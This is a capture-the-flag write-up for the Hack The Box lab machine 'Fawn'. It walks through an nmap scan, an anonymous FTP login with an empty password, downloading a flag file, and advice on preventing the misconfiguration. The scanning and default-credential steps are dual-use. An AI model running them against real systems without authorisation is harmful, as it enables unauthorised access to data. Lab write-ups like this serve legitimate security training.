# Fawn — Hack The Box

---

## Machine Information

| Field      | Value |
| ---------- | ----- |
| Name       | Fawn  |
| Difficulty | Easy  |
| OS         | Linux |

---

## Objective

Gain access by identifying exposed services and exploiting misconfigurations.

---

## Methodology

Recon → Enumeration → Exploitation → Flag Retrieval

---

## Reconnaissance

###  Nmap Scan

```bash id="r8d2hq"
nmap -sC -sV -oN nmap_initial <TARGET_IP>
```

###  Key Findings

```text id="qv4b3j"
21/tcp open  ftp
```

### Insight

* FTP is exposed → potential for anonymous login
* Common misconfiguration in beginner machines

---

## FTP Enumeration

Connect to FTP:

```bash id="l7oz4r"
ftp <TARGET_IP>
```

Login:

```text id="2zzpzb"
Username: anonymous
Password: (empty)
```

---

## Initial Access

List files:

```bash id="r2w0jg"
ls
```

### Files Found

* `flag.txt`

Download:

```bash id="u4hv7r"
get flag.txt
```

---

## Flag

```bash id="g7j1i5"
cat flag.txt
```

---

##  Key Learnings

* Anonymous FTP access can expose sensitive files
* Always test default/anonymous credentials
* Enumeration alone can solve simple machines

---

## Tools Used

* Nmap
* FTP client

---

## Attack Timeline

| Phase        | Time   |
| ------------ | ------ |
| Recon        | 10 min |
| Enumeration  | 5 min  |
| Exploitation | 5 min  |

**Total:** ~20 minutes

---

##  Prevention

* Disable anonymous FTP access
* Restrict file permissions
* Monitor FTP access logs

---

## Summary

This machine demonstrates how **anonymous FTP access** can directly expose sensitive data without requiring advanced exploitation.

---

 For educational purposes only.
